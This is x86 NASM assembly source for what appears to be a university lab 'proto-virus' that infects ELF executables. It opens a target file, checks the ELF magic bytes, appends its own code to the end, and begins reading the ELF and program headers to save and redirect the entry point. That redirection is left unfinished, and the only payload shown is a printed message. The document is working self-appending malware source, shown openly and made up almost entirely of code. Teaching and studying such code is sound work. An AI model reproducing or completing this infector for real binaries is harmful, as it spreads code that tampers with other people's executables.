%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
	
global _start

;;;;;;;;;;;;;;;;;;;;;;;;;

%define Local_1_EBP_OFFSET 4
%define Local_2_EBP_OFFSET 8

%macro print_OutStr 0
	pushad
	get_symbal_rt_address_to_ecx OutStr
	mov ebx, ecx
	;get_symbal_rt_address_to_ecx OutStr_len 
	write 1, ebx, 32
	popad
	;write 1, OutStr, OutStr_len
%endmacro

%macro print_Failstr 0
	pushad
	get_symbal_rt_address_to_ecx Failstr
	mov ebx, ecx
	;get_symbal_rt_address_to_ecx Failstr_len 
	write 1, ebx, 13
	popad
	;write 1, Failstr, Failstr_len
%endmacro

%macro print_openFail 0
	pushad
	get_symbal_rt_address_to_ecx OpenErrStr
	mov ebx, ecx
	;get_symbal_rt_address_to_ecx OpenErrStr_len 
	write 1, ebx, 16
	popad
	;write 1, OpenErrStr, OpenErrStr_len
%endmacro

%macro get_symbal_rt_address_to_ecx 1
	call get_my_loc
    mov edx, next_i                     
    sub edx, %1                   
    sub ecx, edx   
%endmacro

%macro reset_regs 0
	mov eax, 0
	mov ebx, 0
	mov ecx, 0
	mov edx, 0
%endmacro

;;;;;;;;;;;;;;;;;;;;;;;;;
	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	pushad
	
	print_OutStr ; printing the outstr
	
	open FileName,RDWR,0777
	mov [ebp-Local_1_EBP_OFFSET], eax  ;save fd in local vars
	cmp dword[ebp-Local_1_EBP_OFFSET], -1
    jle VirusExit_with_err.print_openFail

	mov ecx,ebp
    sub ecx,Local_2_EBP_OFFSET;
    read dword[ebp-Local_1_EBP_OFFSET],ecx,4; read from fd that is in [ebp-4] the magic numbers to begining address of [ebp-8]
    cmp byte[ebp-Local_2_EBP_OFFSET], 0x7f; elfmago0
    jne VirusExit_with_err;
    cmp byte[ebp-Local_2_EBP_OFFSET+1],'E'; elfmago1
    jne VirusExit_with_err;
    cmp byte[ebp-Local_2_EBP_OFFSET+2], 'L'; elfmago2
    jne VirusExit_with_err;
    cmp byte[ebp-Local_2_EBP_OFFSET+3],'F'; elfmago3
    jne VirusExit_with_err;

	print_OutStr ; printing the outstr
	
	lseek dword[ebp-Local_1_EBP_OFFSET],0,SEEK_SET
	
	.infection:
	lseek dword[ebp-Local_1_EBP_OFFSET], 0, SEEK_END ; get to end of file
	mov [ebp-Local_2_EBP_OFFSET],eax ; save to local the original file size
	;; get to ecx virus_end real time address
	get_symbal_rt_address_to_ecx virus_end
	mov ebx, ecx
	get_symbal_rt_address_to_ecx _start
	sub ebx, ecx
	write dword[ebp-Local_1_EBP_OFFSET], ecx, ebx ; write the print command
	
	;mov edx, virus_end
	;sub edx, _start
	;write dword[ebp-Local_1_EBP_OFFSET], _start, edx ; write the print command


	.rewrite_elfheader:
	lseek dword[ebp-Local_1_EBP_OFFSET],0,SEEK_SET;getting the file bact to begin point
    ;cmp eax,0
	;jl VirusExit_with_err; jump if less than 0 or equal

	; Rewriting the original ELF header
	; Copy original Elf header to stack 
	;read dword[ebp-4],[ebp-8-52 = ebp-60],32
	mov ecx,ebp
    sub ecx,Local_2_EBP_OFFSET
	sub ecx,ELFHDR_size
	read dword[ebp-Local_1_EBP_OFFSET],ecx,ELFHDR_size; elf header of size 52, 8 bytes from epb already in use
    ;save old entry point
	mov ebx, dword[ebp-60+ENTRY] ; begining of elf header on stack + ENTRY offset
	;mov dword[ebp-8-52-4 = ebp-64], ecx 
	mov dword[ebp-Local_2_EBP_OFFSET-ELFHDR_size-4], ebx ; Save old entry to [ebp-64]

	;; last used offset is 64 ;;

	reset_regs	

	; Rewriting the original ELF program header
	; Update file size - file size is in program header table

	mov eax, [ebp-60+ELFHDR_phoff] ; now [eax] is begining offset of program header
	;mov eax, [eax] ;now eax is program header offset 

	lseek dword[ebp-Local_1_EBP_OFFSET], eax, SEEK_SET ;fd is now pointing to read program header
	; Copy original Elf program header to stack 
	; read dword[ebp-4],[ebp-8-52-4-32 = ebp-96],32
	mov ecx,ebp
    sub ecx,Local_2_EBP_OFFSET
	sub ecx,ELFHDR_size
	sub ecx,4
	sub ecx,PHDR_size
	read dword[ebp-Local_1_EBP_OFFSET],ecx,PHDR_size; elf header of size 52, 8 bytes from epb already in use





	.beforeEnd:	
	close [ebp-Local_1_EBP_OFFSET]



VirusExit:
	popad
	add	esp, STK_RES
	pop ebp

       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)


VirusExit_with_err:
	
	.print_Failstr:
		print_Failstr
		jmp .exit

	.print_openFail:
		print_openFail
		jmp .exit

	.exit:
    	exit 1            
	
FileName:	db "ELFexecTestFile", 0
;FileName:	db "ELFexec1", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
;OutStr_len: equ $-OutStr
;OutStr_len: db 32
Failstr:        db "perhaps not", 10 , 0
;Failstr_len: equ $-Failstr
;Failstr_len: db 13
OpenErrStr: db "File open fail", 10, 0
;OpenErrStr_len: equ $-OpenErrStr
;OpenErrStr_len: db 16

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


